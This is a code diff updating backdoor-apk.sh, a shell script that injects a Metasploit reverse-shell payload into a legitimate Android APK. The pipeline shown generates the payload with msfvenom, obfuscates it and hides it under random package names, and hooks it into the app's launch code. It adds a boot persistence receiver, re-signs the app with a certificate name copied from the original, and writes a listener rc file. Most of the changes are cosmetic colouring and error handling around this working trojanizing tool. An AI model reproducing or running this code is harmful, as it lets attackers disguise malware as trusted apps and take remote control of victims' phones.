@@ -2,7 +2,7 @@
 
 # file: backdoor-apk.sh
 
-# version: 0.1.4
+# version: 0.1.5
 
 # usage: ./backdoor-apk.sh original.apk
 
@@ -12,6 +12,7 @@
 
 # IMPORTANT: The following packages were required on Kali Linux in order to get things rolling. These packages are likely required by other Linux distros as well.
 # apt-get install lib32z1 lib32ncurses5 lib32stdc++6
+
 
 PAYLOAD=""
 LHOST=""
@@ -33,7 +34,24 @@ RAT_APK_FILE=Rat.apk
 LOG_FILE=$MY_PATH/run.log
 TIME_OF_RUN=`date`
 
+
+# colors for messages
+green="\033[32m"
+blue="\033[34m"
+red="\033[0;31m"
+yellow="\033[33m"
+normal="\033[0m"
+
 # functions
+function exception_handler {
+  if [ $1 != 0 ]; then
+    echo -e "$red $2 $normal"
+    cleanup
+    exit $1
+  fi
+}
+
+
 function cleanup {
   echo "Forcing cleanup due to a failure or error state!" >>$LOG_FILE 2>&1
   bash cleanup.sh >>$LOG_FILE 2>&1
@@ -41,33 +59,32 @@ function cleanup {
 
 function verify_orig_apk {
   if [ -z $ORIG_APK_FILE ]; then
-    echo "[!] No original APK file specified"
+    echo -e "$red[!] No original APK file specified $normal"
     exit 1
   fi
 
   if [ ! -f $ORIG_APK_FILE ]; then
-    echo "[!] Original APK file specified does not exist"
+    echo -e "$red[!] Original APK file specified does not exist$normal"
     exit 1
   fi
 
   $UNZIP -l $ORIG_APK_FILE >>$LOG_FILE 2>&1
   rc=$?
-  if [ $rc != 0 ]; then
-    echo "[!] Original APK file specified is not valid"
-    exit $rc
-  fi
+  exception_handler $rc "[!] Original APK file specified is not valid"
+
 }
 
 function consult_which {
   which $1 >>$LOG_FILE 2>&1
   rc=$?
   if [ $rc != 0 ]; then
-    echo "[!] Check your environment and configuration. Couldn't find: $1"
+    echo -e "$red[!] Check your environment and configuration. Couldn't find: $1$normal"
     exit $rc
   fi
 }
 
 function print_ascii_art {
+echo -e "$yellow"
 cat << "EOF"
           ________
          / ______ \
@@ -84,11 +101,13 @@ ________|__________|__________________________________________
        |____________|             Dana James Traversie
 
 EOF
+echo -e $normal
 }
 
 function get_payload {
-  echo "[+] Android payload options:"
-  PS3='[?] Please select an Android payload option: '
+  echo -e  "$blue[+] Android payload options:$normal"
+  PS3="[?] Please select an Android payload option:"
+  echo -e "$yellow"
   options=("meterpreter/reverse_http" "meterpreter/reverse_https" "meterpreter/reverse_tcp" "shell/reverse_http" "shell/reverse_https" "shell/reverse_tcp")
   select opt in "${options[@]}"
   do
@@ -118,10 +137,11 @@ function get_payload {
         break
         ;;
       *)
-        echo "[!] Invalid option selected"
+        echo -e "$red[!] Invalid option selected$normal"
         ;;
     esac
   done
+echo -e "$normal"
 }
 
 function get_lhost {
@@ -149,7 +169,7 @@ function get_lport {
 function init {
   echo "Running backdoor-apk at $TIME_OF_RUN" >$LOG_FILE 2>&1
   print_ascii_art
-  echo "[*] Running backdoor-apk.sh v0.1.4 on $TIME_OF_RUN"
+  echo -e "$green[*] Running backdoor-apk.sh v0.1.5 on $TIME_OF_RUN $normal"
   consult_which $MSFVENOM
   consult_which $DEX2JAR
   consult_which $UNZIP
@@ -165,41 +185,47 @@ function init {
   get_lport
 }
 
+
+function checkLibs {
+if [ $(dpkg-query -W -f='${Status}' $1 2>/dev/null | grep -c "ok installed") -eq 0 ];
+then
+  apt-get install "$1";
+else
+  echo -e "$blue $1 installed $normal"
+fi
+}
+
 # kick things off
 init
 
-echo -n "[*] Generating RAT APK file..."
+echo -e "$red++++++++ Checking for required Libraries ++++++++$normal"
+checkLibs lib32z1
+checkLibs lib32ncurses5
+checkLibs lib32stdc++6
+echo
+
+echo -ne "$green[*] Generating RAT APK file...$normal"
 $MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
-  echo "[!] Failed to generate RAT APK file"
-  exit 1
-fi
-echo "[+] Using payload: $PAYLOAD"
-echo "[+] Handle the reverse connection at: $LHOST:$LPORT"
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to generate RAT APK file"
 
-echo -n "[*] Decompiling RAT APK file..."
+echo -e "$blue   [+] Using payload: $PAYLOAD $normal"
+echo -e "$blue   [+] Handle the reverse connection at: $LHOST:$LPORT $normal"
+
+echo -ne "$green[*] Decompiling RAT APK file...$normal"
 $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to decompile RAT APK file"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to decompile RAT APK file"
 
-echo -n "[*] Decompiling original APK file..."
+echo -ne "$green[*] Decompiling original APK file... $normal"
 $APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to decompile original APK file"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to decompile original APK file"
 
-echo -n "[*] Merging permissions of original and payload projects..."
+echo -ne "$green[*] Merging permissions of original and payload projects... $normal"
 # build random hex placeholder value without openssl
 placeholder=''
 for i in `seq 1 4`; do
@@ -222,64 +248,44 @@ mv $merged_manifest_file.uniq $merged_manifest_file
 sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
 diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
 mv $merged_manifest_file $original_manifest_file
-echo "done."
+echo -e "$blue Done! $normal"
 
 # cleanup payload directory after merging app permissions
 rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
 
 # use dex2jar, proguard, and dx
 # to shrink, optimize, and obfuscate original Rat.apk code
-echo -n "[*] Running proguard on RAT APK file..."
+echo -ne "$green[*] Running proguard on RAT APK file... $normal"
 mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
 mkdir -v -p $MY_PATH/libs >>$LOG_FILE 2>&1
 mv $MY_PATH/$RAT_APK_FILE $MY_PATH/bin/classes >>$LOG_FILE 2>&1
 $DEX2JAR $MY_PATH/bin/classes/$RAT_APK_FILE -o $MY_PATH/bin/classes/Rat-dex2jar.jar >>$LOG_FILE 2>&1
 rc=$?
-if [ $rc != 0 ]; then
-  echo "done."
-  echo "[!] Failed to run dex2jar on RAT APK file"
-  cleanup
-  exit $rc
-fi
+exception_handler $rc "[!] Failed to run dex2jar on RAT APK file"
+
 # inject Java classes
 cp -R $MY_PATH/java/classes/* $MY_PATH/libs/ >>$LOG_FILE 2>&1
 rc=$?
-if [ $rc != 0 ]; then
-  echo "done."
-  echo "[!] Failed to inject Java classes"
-  cleanup
-  exit $rc
-fi
+exception_handler $rc "[!] Failed to inject Java classes"
+
 cd $MY_PATH/bin/classes && jar xvf Rat-dex2jar.jar >>$LOG_FILE 2>&1
 cd $MY_PATH
 rm $MY_PATH/bin/classes/*.apk $MY_PATH/bin/classes/*.jar >>$LOG_FILE 2>&1
 $PROGUARD @android.pro >>$LOG_FILE 2>&1
 rc=$?
-if [ $rc != 0 ]; then
-  echo "done."
-  echo "[!] Failed to run proguard with specified configuration"
-  cleanup
-  exit $rc
-fi
+exception_handler $rc "[!] Failed to run proguard with specified configuration"
+
 $DX --dex --output="$MY_PATH/$RAT_APK_FILE" $MY_PATH/bin/classes-processed.jar >>$LOG_FILE 2>&1
 rc=$?
-if [ $rc != 0 ]; then
-  echo "done."
-  echo "[!] Failed to run dx on proguard processed jar file"
-  cleanup
-  exit $rc
-fi
-echo "done."
+exception_handler $rc "[!] Failed to run dx on proguard processed jar file"
+echo -e "$blue Done! $normal"
 
-echo -n "[*] Decompiling obfuscated RAT APK file..."
+echo -ne "$green[*] Decompiling obfuscated RAT APK file..."
 $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to decompile RAT APK file"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to decompile RAT APK file"
+
 
 # avoid having com/metasploit/stage path to smali files
 tldlist_max_line=`wc -l $MY_PATH/lists/tldlist.txt |awk '{ print $1 }'`
@@ -294,31 +300,24 @@ namelist_rand_line=`shuf -i 1-${namelist_max_line} -n 1`
 payload_sub_dir=`sed "${namelist_rand_line}q;d" $MY_PATH/lists/namelist.txt`
 echo "payload_sub_dir is: $payload_sub_dir" >>$LOG_FILE 2>&1
 
-echo -n "[*] Creating new directories in original project for RAT smali files..."
+echo -ne "$green[*] Creating new directories in original project for RAT smali files...$normal"
 mkdir -v -p $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to create new directories for RAT smali files"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to create new directories for RAT smali files"
 
-echo -n "[*] Copying RAT smali files to new directories in original project..."
+echo -ne "$green[*] Copying RAT smali files to new directories in original project...$normal"
 cp -v $MY_PATH/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
   cp -v $MY_PATH/payload/smali/net/dirtybox/util/{a.smali,b.smali,c.smali,d.smali} $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
   rc=$?
 fi
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to copy RAT smali files"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to copy RAT smali files"
 
-echo -n "[*] Fixing RAT smali files..."
+
+echo -ne "$green[*] Fixing RAT smali files...$normal"
 sed -i 's/MainBroadcastReceiver/AppBoot/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/AppBoot.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
@@ -329,14 +328,11 @@ if [ $rc == 0 ]; then
   sed -i 's|net\([./]\)dirtybox\([./]\)util|'"$payload_tld"'\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/{a.smali,b.smali,c.smali,d.smali,AppBoot.smali} >>$LOG_FILE 2>&1
   rc=$?
 fi
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to fix RAT smali files"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to fix RAT smali files"
 
-echo -n "[*] Obfuscating const-string values in RAT smali files..."
+
+echo -ne "$green[*] Obfuscating const-string values in RAT smali files...$normal"
 cat >$MY_PATH/obfuscate.method <<EOL
 
     invoke-static {###REG###}, L###CLASS###;->a(Ljava/lang/String;)Ljava/lang/String;
@@ -384,14 +380,11 @@ if [ $rc == 0 ]; then
     rc=1
   fi
 fi
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to obfuscate const-string values in RAT smali files"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to obfuscate const-string values in RAT smali files"
 
-echo -n "[*] Locating smali file to hook in original project..."
+
+echo -ne "$green[*] Locating smali file to hook in original project...$normal"
 total_package=`head -n 2 $MY_PATH/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml |awk -F ":" '{ print $1 }'`
 echo "Found launcher line in manifest file: $launcher_line_num" >>$LOG_FILE 2>&1
@@ -415,25 +408,19 @@ if [ ! -f $smali_file_to_hook ]; then
   smali_file_to_hook=$MY_PATH/original/smali/$total_package$tmp.smali
 fi
 echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
-echo "done."
-if [ ! -f $smali_file_to_hook ]; then
-  echo "[!] Failed to locate smali file to hook"
-  cleanup
-  exit 1
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to locate smali file to hook"
 
-echo -n "[*] Adding hook in original smali file..."
+
+echo -ne "$green[*] Adding hook in original smali file...$normal"
 sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$payload_tld"'\/'"$payload_primary_dir"'\/'"$payload_sub_dir"'\/a;->a(Landroid\/content\/Context;)V' $smali_file_to_hook >>$LOG_FILE 2>&1
 grep -B 2 "$payload_tld/$payload_primary_dir/$payload_sub_dir/a" $smali_file_to_hook >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to add hook"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to add hook"
 
-echo -n "[*] Adding persistence hook in original project..."
+
+echo -ne "$green[*] Adding persistence hook in original project...$normal"
 cat >$MY_PATH/persistence.hook <<EOL
         <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
             <intent-filter>
@@ -451,22 +438,15 @@ if [ $rc == 0 ]; then
     rc=$?
   fi
 fi
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to add persistence hook"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to add persistence hook"
 
-echo -n "[*] Recompiling original project with backdoor..."
+
+echo -ne "$green[*] Recompiling original project with backdoor...$normal"
 $APKTOOL b $MY_PATH/original >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to recompile original project with backdoor"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to recompile original project with backdoor"
 
 keystore=$MY_PATH/signing.keystore
 compiled_apk=$MY_PATH/original/dist/$ORIG_APK_FILE
@@ -476,48 +456,53 @@ orig_rsa_cert=`$UNZIP -l $ORIG_APK_FILE |grep ".RSA" |awk ' { print $4 } '`
 dname=`$UNZIP -p $ORIG_APK_FILE $orig_rsa_cert |$KEYTOOL -printcert |head -n 1 |sed 's/^.*: CN=/CN=/g'`
 echo "dname value: $dname" >>$LOG_FILE 2>&1
 
-echo -n "[*] Generating RSA key for signing..."
+echo -ne "$green[*] Generating RSA key for signing...$normal"
 $KEYTOOL -genkey -noprompt -alias signing.key -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 -validity 10000 >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to generate RSA key"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to generate RSA key"
 
-echo -n "[*] Signing recompiled APK..."
+echo -ne "$green[*] Signing recompiled APK...$normal"
 $JARSIGNER -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to sign recompiled APK"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to sign recompiled APK"
 
-echo -n "[*] Verifying signed artifacts..."
+echo -ne "$green[*] Verifying signed artifacts...$normal"
 $JARSIGNER -verify -certs $compiled_apk >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to verify signed artifacts"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to verify signed artifacts"
+
 
 mv $compiled_apk $unaligned_apk
 
-echo -n "[*] Aligning recompiled APK..."
+echo -ne "$green[*] Aligning recompiled APK...$normal"
 $ZIPALIGN 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
 rc=$?
-echo "done."
-if [ $rc != 0 ]; then
-  echo "[!] Failed to align recompiled APK"
-  cleanup
-  exit $rc
-fi
+echo -e "$blue Done! $normal"
+exception_handler $rc "[!] Failed to align recompiled APK"
 
 rm $unaligned_apk
+
+## Generate Metasploit RC file (msfconsole -r backdoorApk.rc).
+echo -ne "$green[*] Generating Metasploit rc file..$normal"
+echo "use exploit/multi/handler" > backdoorApk.rc
+echo "load sounds" >> backdoorApk.rc
+echo "set payload $PAYLOAD" >> backdoorApk.rc
+echo "set LHOST $LHOST" >> backdoorApk.rc
+echo "set LPORT $LPORT" >> backdoorApk.rc
+echo "set setg EnableStageEncoding true" >> backdoorApk.rc
+echo "set TimestampOutput true" >> backdoorApk.rc
+echo "set ExitOnSession false" >> backdoorApk.rc
+echo "set VERBOSE true" >> backdoorApk.rc
+echo "exploit -j" >> backdoorApk.rc
+rc=$?
+echo -e "$blue Done! $normal"
+
+exception_handler $rc "[!] Failed to align recompiled APK"
+echo
+
+echo -e "$yellow To start the handler run : $normal $green msfconsole -r backdoorApk.rc $normal"
 
 exit 0
